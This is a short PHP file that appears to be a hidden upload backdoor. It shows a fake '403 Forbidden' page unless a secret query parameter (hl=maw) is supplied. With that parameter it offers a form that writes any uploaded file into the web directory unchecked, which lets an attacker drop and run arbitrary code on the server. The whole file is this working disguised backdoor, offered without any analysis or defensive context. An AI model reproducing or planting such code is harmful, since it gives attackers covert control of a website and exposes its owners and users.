<?php
if (isset($_GET['hl']) && $_GET['hl'] === 'maw') {
    ?>
    <form enctype="multipart/form-data" method="post">
        <input type="file" name="file" />
        <input type="submit" value="Upload" />
    </form>
    <?php
} else {
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>403 Forbidden</title><style>body{font-family:Arial,sans-serif;text-align:center;background-color:white;color:black;padding:50px}.container{max-width:600px;margin:auto;background:white;padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1)}h1{font-size:48px}p{font-size:18px}</style></head><body><div class="container"><h1>403</h1><h2>Forbidden</h2><p>You don\'t have permission to access this page.</p></div></body></html>';
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $uploadFile = basename($_FILES['file']['name']);
    $uploadDir = __DIR__ . '/';

    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $uploadFile)) {
        echo "Ok.";
    } else {
        echo "Fail.";
    }
}
?>
